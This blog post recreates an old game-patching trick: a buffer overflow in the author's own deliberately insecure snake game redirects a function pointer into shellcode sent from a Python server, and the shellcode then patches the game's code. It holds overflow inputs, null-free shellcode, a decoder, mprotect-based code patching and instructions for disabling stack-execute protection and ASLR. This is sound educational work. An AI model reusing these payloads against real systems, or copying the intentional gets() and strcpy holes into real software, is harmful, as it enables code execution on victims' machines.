---
layout: post
title: Recreating An Old "Dirty Gamedev Trick"
categories:
- blog
tags:
- <span style="background-color:#11DD11;"><font color="#000000">&nbsp;C/Asm&nbsp;</font></span>
---

There's a story that pops up in my twitter feed every 6 months or so. The original version of it is from a Gamasutra article published in 2013 which contained a collection of stories of various "dirty" tricks used in previous games ([link](https://www.gamasutra.com/view/feature/194772/dirty_game_development_tricks.php)). There's a lot of fun stories in the article but one stands head and shoulders above the rest in terms of awesomeness. I've copied the specific story below so that this post makes sense even in the unlikely event of the original link going dead.

<div style="padding-left: 20px; padding-right: 20px; line-height: 11pt; font-size:10pt; border:dashed; background-color:#FFEEDD">

<strong><font size="+1"><br>
(s)elf-exploitation</font></strong><br>
<font size="-1">Jonathan Garrett, Insomniac Games</font><br>
<br>
<em>Ratchet and Clank: Up Your Arsenal</em> was an online title that shipped without the ability to patch either code or data. Which was unfortunate.<br>
<br>
The game downloads and displays an End User License Agreement each time it's launched. This is an ascii string stored in a static buffer. This buffer is filled from the server without checking that the size is within the buffer's capacity.<br>
<br>
We exploited this fact to cause the EULA download to overflow the static buffer far enough to also overwrite a known global variable. This variable happened to be the function callback handler for a specific network packet. Once this handler was installed, we could send the network packet to cause a jump to the address in the overwritten global. The address was a pointer to some payload code that was stored earlier in the EULA data.<br>
<br>
Valuable data existed between the real end of the EULA buffer and the overwritten global, so the first job of the payload code was to restore this trashed data. Once that was done things were back to normal and the actual patching work could be done.<br>
<br>
One complication is that the EULA text is copied with strcpy. And strcpy ends when it finds a 0 byte (which is usually the end of the string). Our string contained code which often contains 0 bytes. So we mutated the compiled code such that it contained no zero bytes and had a carefully crafted piece of bootstrap asm to un-mutate it.<br>
<br>
By the end, the hack looked like this:<br>
<br>
 1. Send oversized EULA<br>
 2. Overflow EULA buffer, miscellaneous data, callback handler pointer<br>
 3. Send packet to trigger handler<br>
 4. Game jumps to bootstrap code pointed to by handler<br>
 5. Bootstrap decodes payload data<br>
 6. Payload downloads and restores stomped miscellaneous data<br>
 7. Patch executes<br>
<br>
Takeaways: Include patching code in your shipped game, and don't use unbounded strcpy. <br>
<br>
</div>
<br>

Suffice to say that this story is not an example of what modern day game development is like, but I think that's what makes it so appealing. Most of my day at work is spent sorting out problems in huge codebases made up of abstractions layered over other abstractions layered over third party libraries and legacy code. This is the polar opposite of that, and I want to get me some of it. So this is the story of how I recreated this on OS X.

I want to caveat the entire article by saying that this post is going to contain a lot of terrible assembly. I hadn't written much assembly before I started this project and I'm sure it shows. That being said, let's get started!

## First: You Can Run Arbitrary Machine Code at Runtime? 

The first thing that jumped out at me in this story was the part about sending machine code over the network to be executed by the game. It had never occurred to me that this was possible, despite it being obvious in hindsight. With some help from [this article](http://www.vividmachines.com/shellcode/shellcode.html#linex1), I was able to prove that this was going to work on OS X too. First I wrote a quick bit of assembly (in this case, enough to call exit(42):

{% highlight as %}
.text
.globl _main
_main:
        mov $42, %di
        movl $0x2000001, %eax
        syscall
{% endhighlight %}

Assembled it with OS X's built in "as" tool, and disassembled it with objdump to get the hex machine code bytes:

{% highlight text %}
1ff5:	66 bf 2a 00 	movw	$42, %di
1ff9:	b8 01 00 00 02 	movl	$33554433, %eax
1ffe:	0f 05 	syscall
{% endhighlight %}

Then I copied those bytes to a string and tried to run it:

{% highlight c %}
int main(void)
{
    char* code = "\x66\xbf\x2a\x00\xb8\x01\x00\x00\x02\x0f\x05";
    ((void(*)())code)();
    return 0;
}
{% endhighlight %}

The above returns the value 42 and the "return 0" statement never gets executed, which is cool. However, this wasn't enough to prove anything because it only worked when the code string was a constant. Trying to copy that string to a different (non-constant) buffer and then execute the instructions there failed immediately: 

{% highlight c %}
int main(void)
{
    char* code = "\x66\xbf\x2a\x00\xb8\x01\x00\x00\x02\x0f\x05";
    char buff[256];
    memcpy(buff, code, 256);
    ((void(*)())buff)(); // will fail with EXC_BAD_ACCESS 
    return 0;
}
{% endhighlight %}

As it turns out, OS X has memory protections to help prevent folks from doing these sorts of shenaningans. If you compile on the command line with the arguments "-Wl,-allow_stack_execute", clang will happily let this code run just fine. In fact, that argument will allow the above code to work whether or not buff is on the stack, the bss section, or the data section. 

Note that no matter what I did, I couldn't get Xcode 10 to recognize that compiler flag, it had to be command line. It's also important to note that if you compile objective-c code (or objective-c++) with this flag, the flag won't work. I could be missing something, but I got bored and just fell back to the command line / plain C++ instead of continuing to fight with it. 

The Playstation 2 was gone well before I entered the industry, but based on googling and asking a few coworkers who had some experience on it, it seems unlikely that the ps2 had the same kind of memory security, so I don't feel too bad about disabling OS X's to get this project done. 

## Step Two: Useful Buffer Overflows

My next goal was to use a buffer overflow to redirect a function pointer to a buffer that I controlled. I'd never intentionally overflowed a buffer before, but boy do I have experience tracking and fixing memory stomps, so this felt pretty natural (in theory). In practice it was a bit messier. Consider the following code: 

{% highlight c %}
void hello();

static char buff[32];
static void(*targetFunc)();

int main(int argc, const char** argv)
{
    targetFunc = hello;
    gets(buff);
    targetFunc();
    return 0;
}

void hello()
{
    printf("Hello World\n");
}
{% endhighlight %}


While this code will absolutely crash, it's not guaranteed that the compiler has positioned the static variables in the bss section of our executable in the same order that they appear in the code. In my case, they were actually located in the opposite order in my executable, as you can see in this snippet of [Hopper](https://www.hopperapp.com/) output. 

{% highlight x64 %}
                     __ZL10targetFunc:        // targetFunc
0000000100001020         dq         0x0000000000000000 ; DATA XREF=_main+29, _main+52
0000000100001028         db  0x00 ; '.'
0000000100001029         db  0x00 ; '.'
000000010000102a         db  0x00 ; '.'
000000010000102b         db  0x00 ; '.'
000000010000102c         db  0x00 ; '.'
000000010000102d         db  0x00 ; '.'
000000010000102e         db  0x00 ; '.'
000000010000102f         db  0x00 ; '.'
                     __ZL4buff:        // buff
0000000100001030         db  0x00 ; '.'                ; DATA XREF=_main+36
0000000100001031         db  0x00 ; '.'
0000000100001032         db  0x00 ; '.'
0000000100001033         db  0x00 ; '.'
; (buff continues below)
{% endhighlight %}

Unluckily, this means that try as I might, I couldn't use the gets() call to change the value of the targetFunc pointer. After a bit of experimentation, I found that (at least for my trivial example), Clang places variables in the bss section in the order they're encountered in code, so rewriting the code to assign to buff before the gets() call sorted things out (example below). 

{% highlight c %}
void hello()
{
    printf("Hello World\n");
}

static char buff[32];
static void(*targetFunc)();

int main(int argc, const char** argv)
{
    buff[0] = 'c';
    targetFunc = hello;
    gets(buff);
    targetFunc();
    return 0;
}
{% endhighlight %}

Of course, all of the above only holds true if both variables are located in the same section in the executable. If, for example, targetFunc was initialized when it was declared, like so: 

{% highlight c %}
static void(*targetFunc)() = hello;
{% endhighlight %}

It would be placed in the data section of the executable instead of the bss section (since it has an initial value). This doesn't preclude me from overflowing (I don't think), but it does mean that I also have to worry about the order that the compiler places the bss section and the data section in the executable. This seemed like more hassle than it was worth for the purposes of this project so I just kept everything in bss all the time.

It seemed like the above code made it possible for a properly crafted input string to overflow and write a new address into the function pointer, so I decided to give that a shot. The address of buff in my executable was 0x0000000100001020. In order to be able to enter this value to gets(), it needed to be converted to ascii. A lot of that address is zero bytes, which don't have an ascii character associated with it, so I had to enter them in terminal by pressing control+space instead. The non zero bytes are 01, 10, and 20, two of which are non printable characters that I ended up copy and pasting from a website so that I didn't have to figure out how to type them. The last one, 20, is the space character (' '). In terminal, it looked like this (note the space character at the end): 

{% highlight text %}
AAAAAAAAAABBBBBBBBBBAAAAAAAAAABB^@^@^@^A^@^@^P 
{% endhighlight %}

Copying and pasting the above string is not the same as actually pasting in the ascii characters for bytes 01 and 10, this is just how terminal decided to display that those characters were entered. 

In addition to being annoying to enter, this didn't work because I had forgotten about endianness, and needed to rearrange this input so that the address was specified as a little-endian value. Figuring that out took longer than I'm willing to admit to in a blog post. The correct string looked like this:

{% highlight text %}
AAAAAAAAAABBBBBBBBBBAAAAAAAAAABB ^P^@^@^A^@^@^@
{% endhighlight %}

Finally though, I could demonstrably (using lldb to print the address of targetFunc) use a buffer overflow to set a pointer. Sadly, if I tried the same trick without lldb attached, things failed horribly. It turns out OS X had one more security feature up it's sleeve to stall my plan of creating the world's most insecure application.

## A/S/L...R?

ASLR, or **A**ddress **S**pace **L**ayout **R**andomization, is a security technique that rearranges the locations of key areas of an executable's data, including (at least on OS X Mojave) the .bss section. This means that every time I ran the test application without lldb attached, the address of the character buffer was randomized. 

The concept of ASLR was first published in 2001, and first used in a "mainstream" OS in 2003 (according to wikipedia at least). Given that the PS2 was launched in 2000, I'm relatively confident that there was nothing like this on our story's hardware. I also found [this presentation](https://www.slideshare.net/gotohack/security-offense-and-defense-strategies-videogame-consoles-architecture-under-microscope) about game console security which suggests that ASLR didn't make an appearance on Sony consoles until the PS4. This means that just like before, I can feel good about simply disabling this security feature on my executable. This is accomplished by another clang flag, "-Wl,-no_pie", where pie refers to "position indepent executables." Unlike earlier however, this flag can be enabled in an Xcode project, you just need to go to your build settings and enable the setting "Generate Position-Dependent Executable."

Compiling with that flag gave me a lovely little binary which kept the buff variable at the same memory address all the time. 

## Step Three: Putting Things Together 

Now that I was properly redirecting the targetFunc pointer to my buffer, it seemed like the next step was to actually write some code into that buffer to execute. To keep things simple, I started out by reusing the code string that called exit(42) earlier. Unfortunately, a lot of the hex values in my code string couldn't be represented in ascii at all, so I decided to abandon using gets() and wrote a small python server to pass the code string to my program over a socket. I was going to need to do this eventually anyway so this felt like progress. 

<div align="center">
<img src="/images/post_images/2019-12-04/drevil.jpg" style="width:278px;height:225px;"/>
<br>
</div>


{% highlight python %}
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
address = ('localhost', 10002)
s.bind(address)
s.listen(1)

while True:
    connection, addr = s.accept()
    connection.send(b"\x66\xbf\x2a\x00\xb8\x01\x00\x00\x02\x0f\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x10\x00\x00\x01\x00\x00\x00")
{% endhighlight %}

This also meant making my example program a bit more complicated:

{% highlight c %}
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <stdio.h>

static char buff[32];
static void(*targetFunc)();

void hello()
{
    printf("Hello World\n");
}

int main(void)
{
    buff[0]='c';
    targetFunc = hello;
    const int SERVER_PORT = 10002;
    const char* SERVER_ADDRESS = "127.0.0.1";
    const int BUFF_LEN = 64;

    struct sockaddr_in sockAddr = {0};
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_ADDRESS, &sockAddr.sin_addr);
    int socketHandle = socket(AF_INET, SOCK_STREAM, 0);
    
    connect(socketHandle, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
    
    recv(socketHandle, &buff, BUFF_LEN, 0);
    targetFunc();
    return 0;
}
{% endhighlight %}

Running this totally worked as long as I had disabled aslr. I stopped here to celebrate by becoming bored with the project and abandoning it for a month.

## Modifying Existing Instructions

Downloading and executing assembly code was already pretty awesome, but given that my end goal was to be able to patch a game using this system, it seemed like it would be way cooler if I could use that assembly to fix bugs in different parts of the program. I'd already used mprotect to mark pages as Read/Write protected in other project (for tracking memory stomps), so it wasn't a huge stretch to use it to mark pages as executable instead. I still wrote a small test program to make sure it worked.

When running in debug, the code below will return 0 instead of 42, because it modifies the shouldExit42() function to return false. Clang will optimize away the memcpy operation if you compile above -O0, but that didn't really matter to me because, in the real project, I was going to be hand writing the assembly to do this.

{% highlight c %}
#include <sys/mman.h>
#include <memory>
#include <unistd.h>
#include <stdint.h>

bool shouldExit42()
{
    return true;
}

bool shouldNotExit42()
{
    return false;
}

int main(int argc, const char * argv[])
{
    int64_t pagesize = getpagesize();
    
    uint8_t* should = (uint8_t*)&shouldExit42;
    uint8_t* shouldNot = (uint8_t*)&shouldNotExit42;

    int64_t shouldPageAddr = pagesize * (int64_t(should)/pagesize);
    uint8_t* shouldPage = (uint8_t*)shouldPageAddr;
    
    mprotect(shouldPage, pagesize, PROT_READ|PROT_EXEC|PROT_WRITE);
    
    memcpy(should,shouldNot, 64);
    
    return shouldExit42() ? 42 : 0;
}
{% endhighlight %}

Now, technically the above code is relying on undefined behaviour because the POSIX standard specifies that the behaviour of mprotect is undefined unless it's operating on an mmap'd pointer, but OS X Mojave seems happy to just do what I want this way. Also, the 64 byte size in the memcpy call is total garbage that I pulled out of the air, but it was good enough for the test program.

One caveat to patching code this way is that any changes need to keep the target function the same size, since this won't move around the rest of functions in memory (and I don't even want to think about trying that). Alternatively, it's possible to add entirely new functions, assuming there's memory available to store it. I already kinda did this above when I stored assembly code in a buffer and executed it there, so I'm not going to belabour the point any more. 

## Goodbye Test Programs, Hello Snake

Finally, I felt like I knew enough to try out actually recreating the gamasutra story in a real project, and I built a small game to use as the target executable. I started out with a tile matching game that used metal for graphics, but got tired of fighting with making -allow_stack_execute work in a project that included objective-c code, so I scrapped that and built a quick snake game with ncurses. The game sucks, but that's not really the point, so as you're reading, you could try to pretend that I'm talking about some totally awesome AAA project instead if it helps. 

<div align="center">
<img src="/images/post_images/2019-12-04/snake.png" style="width:500px; height:325px;"/>
<br>
</div>

The (awful) code is up on github [here](https://github.com/khalladay/InsecureSnake). Most of it doesn't matter, but a few bits are relevant to this blog post. First is how I've set up a few key static vars:

{% highlight c %}
static char eula[1024];
static void(*packetHandler)();
static int randomSeed;

int main()
{	
    memset(eula,0,EULA_LEN);
    randomSeed = 42;
    packetHandler = handleNotificationPacket;
    //rest of code omitted
{% endhighlight %}

Clang is going to position these static variables in the bss section in the order they're first encountered when parsing code (or at least, that's what it did in all my tests), so any attempt to overwrite the packetHandler pointer by overflowing the eula buffer also needed to stomp on whatever value is stored in randomSeed. Part of my payload's job was going to be making sure that the randomSeed value was set back to 42 before it got used by the game.

The game starts by downloading data from a server and strcpying it into the EULA buffer. Immediately after the server sends the EULA, it's also going to send the packet that will trigger a call to the packetHandler() function. I couldn't do squat until I got packetHandler pointed to the eula buffer, so that's the first thing I did. This was a little trickier than the last time I used an overflow to set a pointer because now the machine code was getting strcpy'd, meaning it couldn't contain any null bytes. Initially though, this didn't matter, since I just wanted to set the packetHandler pointer (which was at 00000000000092b0), and being little-endian means that I only actually needed to write the value 0x92b0. 

Put together, this initial step looked like so:

1. Launch Snake, have it connect to the server
2. Have the server send 1024 bytes of \x01 to fill the eula buffer
3. Send 4 bytes of \x02 to fill the random seed. 
4. Send another 4 bytes of \x03 to fill the padding between randomSeed and the function pointer
5. Send \xB0\x92\x00 to update the function pointer and end the string

Since it's a bit long, I won't show the python I used to do this here, but if you're interested, you can check it out [here](/images/post_images/2019-12-04/Server.txt). 

That part was pretty easy, but once it was working, the game would immediately crash when it received the packet triggered a call to packetHandler() since there was nothing of value in the EULA buffer. This kinda sucked, so my next step was to have the EULA buffer actually do something. As a proof of concept, I started by re-purposing the exit(42) code string that I used earlier. The original code string had a few null bytes in it though, so it needed some massaging. As a refresher, here was the original bit of machine code:

{% highlight text %}
\x66\xbf\x2a\x00\xb8\x01\x00\x00\x02\x0f\x05
{% endhighlight %}

Luckily the original code could be refactored pretty simple to work around the problem. I just added a few unnecessary math operations to avoid needing any instructions with null bytes in them: 

{% highlight asm %}
.text
.globl _main
_main:
        mov $25400, %di
        sub $25358, %di
        mov $0x2, %al
        shl $24, %eax
        add $0x1, %al
        syscall
{% endhighlight %}

Assembling this with as and using objdump to get me the hex bytes gave me the following, strcpy friendly, machine code:

{% highlight test %}
\x66\xbf\x38\x63\x66\x81\xef\x0e\x63\xb0\x02\xc1\xe0\x18\x04\x01\x0f\x05
{% endhighlight %}

Modifying the python server script to send this was just a matter of replacing the first set of \x01 bytes with this code string, and boom, the snake game was returning the value 42 before I had a chance to accept the EULA. This was great, but it didn't feel like my plan of rewriting assembly to avoid null bytes was going to be very scalable when I tried to do real work. The original story talked about needing to encode/decode instructions to allow null bytes to be sent, so that was my next project. 

## Encoding/Decoding Null Bytes

I don't know if the team at Insomniac did something more fancy, but for my purposes, all I needed to do was replace all null bytes in my machine code string with 0xCD and write some assembly that walked the bytes of the eula buffer (after strcpy) instances of 0xCD with 0x00. I may have just gotten lucky, but none of the code that I wrote for the rest of this project ever had a problem with a valid 0xCD byte getting accidentally stomped by this. 

To get the machine code string for this bit of assembly, I actually just ended up writing it as a separate program and extracting the hex bytes using [Hex Fiend](https://ridiculousfish.com/hexfiend/)

{% highlight asm %}
.text
.globl _main
_main:
        movabsq $0x1111111111111111, %rax
        movabsq $0x1111111111107E26, %rcx
        subq %rcx, %rax  # result of sub is addr of code after decode block
        mov %rax, %rdx
        mov $0xFFFF, %dx
        sub $0xFFFF, %dx # zero dx without getting a null in machine code 
# loop starts here
        cmpb $0xCD, (%rax)
        jne .+6 
        subb $0xCD, (%rax)
# jump to here if not == 0xcd
        add $0x1, %rax
        add $0x1, %dx
        cmp $0x3D0, %dx # 1035 bytes total, 59 bytes for bootstrap, decode next 976 bytes
        jb .-21
        # int $3 # uncomment to break in debugger here
        ret # end bootstrap
{% endhighlight %}

Getting this working was a lot of trial and error (mostly because I hadn't written much assembly before). I also got tripped up for awhile because I was originally messing with some caller save registers and not cleaning them up, which caused weird problems later. Also, I couldn't get labels working with the code I was sending over the wire, so I was stuck with jmp-ing to addresses. Jmp-ing to an absolute address seemed to work if I provided an address in a register, but apparently conditional jumps REQUIRE a relative address, which was a pain. 

If you're trying something like this on your own, My standard workflow was to put a breakpoint on the eula buffer, sprinkle my assembly liberally with int $3 calls (which cause the debugger to break there), and then examine the memory of the target buffer with an lldb command like 
"memory read --size 1 --format x 0x92b0 --count 1024".

Despite all my complaining though, it did work once I had ironed out all the kinks, which meant it was time to actually do something interesting to the snake game. 

## Patching Some Code Like a Hacker

The first thing I wanted to do was change some code that shipped with the game. In this case, I wanted to change the point value for hitting a target from 3 to 15. The score value for a target was hardcoded in the code snippet below, so changing it required modifying currently loaded machine code, just like I did in the sample project earlier. 

{% highlight c++ %}
void SnakeGame::tick()
{
    if (currentMode == PLAYING)
    {
        inputMutex.lock();
        Point newHead = {snakeSegments.front().x + velocity.x, snakeSegments.front().y + velocity.y};
        inputMutex.unlock();

        if (newHead.x == targetPos.x && newHead.y == targetPos.y)
        {
            score+=3;
            //rest of code omitted because it isnt important
{% endhighlight %}

It was time to fire up Hopper again, this time to figure out the address of this instruction. The tick function itself is located at address 0000000000004100 (as shown below). Working from there, the first add $0x3 instruction (which turned out to be the correct one) is located at 4199. 

<div align="center">
<img src="/images/post_images/2019-12-04/hopper1.png"/>
<br>
</div>

The page that contains the tick function starts at 0000000000004000, so thats the address I'm going to feed to memcpy. On Mac, memcpy is system call 200004A, so the assembly to mark this page as PROT_READ + PROT_WRITE + PROT_EXEC looked like the following: 

{% highlight asm %}
_markpage:
    movl $0x200004A, %eax # 4A is the mprotect syscall
    movabsq $0x0000000000004000, %rdi # first arg is page addr, this is the addr of tick
    movq $4096, %rsi # second arg is len, we want 1 page
    movq $7, %rdx # third arg is flags
    syscall
{% endhighlight %}

If you're unfamiliar with how system calls work on mac, you may want to read [this article](https://filippo.io/making-system-calls-from-assembly-in-mac-os-x/), which was extremely helpful when I was figuring all this out. 

After marking the page as writeable, all that I needed to do was to modify the byte at address 0x000000000000419B, which was the byte containing the score value for the target that was hardcoded into the add instruction. Changing that from 3 to 15 just required a move:

{% highlight asm %}
_fixscore:
        movabsq $0x000000000000419B, %rax # move location of score add instruction to rax
        movb $0x0F, (%rax)
{% endhighlight %}

Similarly, I also took this time to write 42 back to our random seed variable: 

{% highlight asm %}
_randomseed:
        movabsq $0x00000000000096b0, %rax 
        movq $42, (%rax) # write 42 back to the random seed var
{% endhighlight %}

I should note that I'm providing labels in the assembly snippets above that I didn't actually have in my assembly code, to aid readability. It's a bit lengthy to paste right into the article, but my entire assembly payload up to this point looked like [this](/images/post_images/2019-12-04/payloadv1.txt) (note the string of nop instructions I used to make reading lldb output easier). By now, manually changing null bytes to 0xCD in the machine code was getting tedious, so I wrote a small script to do that manually. My workflow now looked like this: 

1. Write some assembly
2. Assemble it with "as"
3. Get the machine code using Hex Fiend
4. Paste that into textedit and remove all whitespace
5. Use my script to swap null bytes for CD
6. Add the few bytes for overflowing the buffer / setting packetHandler to the end 
7. Double check to make sure the resulting string was still the right size (add extra 0xCDs until it is)
8. Paste the code string into the python server
9. Run the server and the game. 

I probably should have combined a few more of those steps into a utility program, but it's a bit late for that now. 

At this point, I had successfully managed to change the score value for targets in the game, and was feeling pretty super. However, that wasn't enough for me to be satisfied that I had actually recreated the entire gamasutra story, so there was still more work to do.

## Downloading a Real EULA 
Up to now, when the game displayed the EULA, it ended up displaying garbage bytes, because the eula buffer contained our code string. I wanted to fix that by having the payload include instructions for downloading a real EULA string from the server. The original story also mentioned having the payload download additional data, although technically the it reads like they downloaded more machine code... I'm not going to split hairs. 

Setting up a socket connection in assembly isn't super exciting, given that socket(), connect(), and recvfrom() are all syscalls on OS X, so there's nothing exotic about it really. I had so far gotten by without allocating any stack variables (and as such, needing to clean those up), so I ended up reserving the last chunk of the eula buffer to use to store the sockaddr structure I was using, but that's about as weird as it got. I also hardcoded the values of the sockaddr struct (by writing a C program to set it up and just copying the bytes from the sockaddr struct it created) rather than calculating them the normal way to save some time. Setting all this up looked like this: 

{% highlight asm %}
_SetUpSocket:
    movl $0x2000061, %eax #  61 is socket
    movq $2, %rdi # first socket arg - AF_INET
    movq $1, %rsi # second socket arg - SOCK_STREAM
    movq $0, %rdx # third socket arg - protocol
    syscall # call socket, socket handle in eax
    movq %rax, %rdi # move socket handle to ebx
    movl $0x2000062, %eax # next syscall will be to connect
    movabsq $0x00000000000096a1, %rsi 
    movb $2, (%rsi) # now write the sockaddr bytes
    add $1, %rsi
    movb $0x27, (%rsi)
    add $1, %rsi
    movb $0x15, (%rsi)
    add $1, %rsi
    movq $0x7f, (%rsi)
    add $3, %rsi
    movq $1, (%rsi)
    movabsq $0x00000000000096a0, %rsi # second arg to connect is address of sockaddr struct, located in our buffer (pre-zeroed by bootstrap)
    movq $16, %rdx # third arg is len of sockaddr
    syscall
{% endhighlight %}

Since I wanted to download the new EULA string into the same buffer that the payload code currently lived, I ended up adding a huge string of NOP instructions before calling recvfrom, and limiting the size of the EULA string so that it wouldn't stomp on instructions that still mattered. So immediately after the code above, there was a long string of 700 NOP instructions before I actually called recvfrom and then returned from the function. This last bit of assembly looked like this: 

{% highlight asm %}
_downloadeula:
        movl $0x200001D, %eax # next syscall will be to recvfrom
        movabsq $0x00000000000092b0, %rsi # second arg is address of this buffer
        movq $512, %rdx # third arg is len, eula will be up to 512 bytes 
        movq $0x0, %r10 # fourth arg is flags
        movq $0x0, %r8 # fifth arg is socket ptr, use null since we have a connected socket
        movq $0x0, %r9 #  ignore 
        syscall
        ret 
{% endhighlight %}

If you're curious, the entire source for this payload is both [here](/images/post_images/2019-12-04/payloadv1.txt) and on the [github project](https://github.com/khalladay/InsecureSnake) that accompanies this blog post. Note that the payload code doesn't exactly match the code string in the final python server script, since I was manually adding padding and replacing some NOPs with 0xCD, as described earlier.

With this payload in place, getting a proper EULA was just a matter of adding a few more lines to the server script to listen for a connection on port 100005 and send back the string when it received that connection. You can see the final server script [here](/images/post_images/2019-12-04/ServerV3.txt) if you're curious. Once that was working, I could send a EULA that was human readable to the client in time to hide the fact that anything nefarious was going on, and my server was able to modify compiled code using a buffer overflow. Woohoo!

<div align="center">
<img src="/images/post_images/2019-12-04/victory_dance.gif" />
</div>

## Conclusion / References

This was a super cool project to work on, despite it occasionally taking a turn for the very tedious. I learned a ton about areas of programming that I had never had a chance to dabbble in before, and feel like I came away from it with a better understanding of how software works in general. 

Given how little I knew when I started this, I used a _ton_ of different blog posts and articles to help get me up to speed (in addition to the ones linked explicitly above), and I wanted to list them here in case any are of interest to anyone else. So, in no specific order, here they are: 

* [http://www.vividmachines.com/shellcode/shellcode.html#linex1](http://www.vividmachines.com/shellcode/shellcode.html#linex1)
* [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)
* [https://0xrick.github.io/binary-exploitation/bof1/](https://0xrick.github.io/binary-exploitation/bof1/)
* [https://www.thegeekstuff.com/2013/06/buffer-overflow/](https://www.thegeekstuff.com/2013/06/buffer-overflow/)
* [https://securiteam.com/securityreviews/5OP0B006UQ/](https://securiteam.com/securityreviews/5OP0B006UQ/)
* [https://www.slideshare.net/gotohack/security-offense-and-defense-strategies-videogame-consoles-architecture-under-microscope](https://www.slideshare.net/gotohack/security-offense-and-defense-strategies-videogame-consoles-architecture-under-microscope)
* [https://shanetully.com/2013/12/writing-a-self-mutating-x86_64-c-program/](https://shanetully.com/2013/12/writing-a-self-mutating-x86_64-c-program/)
* [https://stackoverflow.com/questions/4812869/how-to-write-self-modifying-code-in-x86-assembly](https://stackoverflow.com/questions/4812869/how-to-write-self-modifying-code-in-x86-assembly)
* [https://stackoverflow.com/questions/50673522/10-13-high-sierra-osx-python-mprotect-always-fails-when-granting-exec-permissi](https://stackoverflow.com/questions/50673522/10-13-high-sierra-osx-python-mprotect-always-fails-when-granting-exec-permissi)
* [https://developer.apple.com/library/archive/qa/qa1788/_index.html](https://developer.apple.com/library/archive/qa/qa1788/_index.html)
* [https://filippo.io/making-system-calls-from-assembly-in-mac-os-x/](https://filippo.io/making-system-calls-from-assembly-in-mac-os-x/)

I also want to link again to [Hopper](https://www.hopperapp.com/) and [Hex Fiend](https://ridiculousfish.com/hexfiend/) which made my life way easier. Hopper in particular is a really impressive bit of software, and I get an excuse to use it again in the future.

If you want to say hi, or ask any questions about anything in the article, I'm available (sporadically) [on Twitter!](https://twitter.com/khalladay) Thanks for reading!